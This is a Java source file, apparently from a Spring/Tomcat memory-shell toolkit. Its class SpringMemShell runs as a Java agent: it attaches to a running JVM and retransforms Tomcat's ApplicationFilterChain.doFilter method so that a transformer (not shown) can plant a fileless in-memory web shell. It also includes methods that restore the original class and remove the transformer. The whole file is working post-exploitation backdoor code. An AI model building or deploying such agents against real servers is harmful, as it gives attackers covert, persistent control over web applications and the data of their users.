package com.stdout.springMem;

import java.io.IOException;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class SpringMemShell {
    public static final String TransformedClassName = "org.apache.catalina.core.ApplicationFilterChain";
    public static final String TransformedMethodName = "doFilter";
    public static ClassFileTransformer T = null;

    public static Instrumentation i = null;

    public static void agentmain(String agentArgs, Instrumentation inst) throws ClassNotFoundException, UnmodifiableClassException, IOException {
        i = inst;
        start();
    }

    public static String back() throws UnmodifiableClassException {
        SpringBackTransformer t = new SpringBackTransformer();
        Class[] classes = i.getAllLoadedClasses();
        for (Class aClass : classes) {
            if (aClass.getName().equals(TransformedClassName)) {
                remove();
                i.addTransformer(t, true);
                i.retransformClasses(aClass);
                T = t;
                remove();
                return "Success";
            }
        }
        return "Class Not Found";
    }

    public static String start() throws UnmodifiableClassException {
        final SpringMemTransformer t = new SpringMemTransformer();
        T = t;
        Class[] classes = i.getAllLoadedClasses();
        for (Class aClass : classes) {
            if (aClass.getName().equals(TransformedClassName)) {
                i.addTransformer(t, true);
                i.retransformClasses(aClass);

                return "Success";
            }
        }
        return "ERROR::";
    }

    public static String remove() {
        try{
            i.removeTransformer(T);
            return "success";
        } catch (Exception e) {
            return e.toString();
        }
    }
}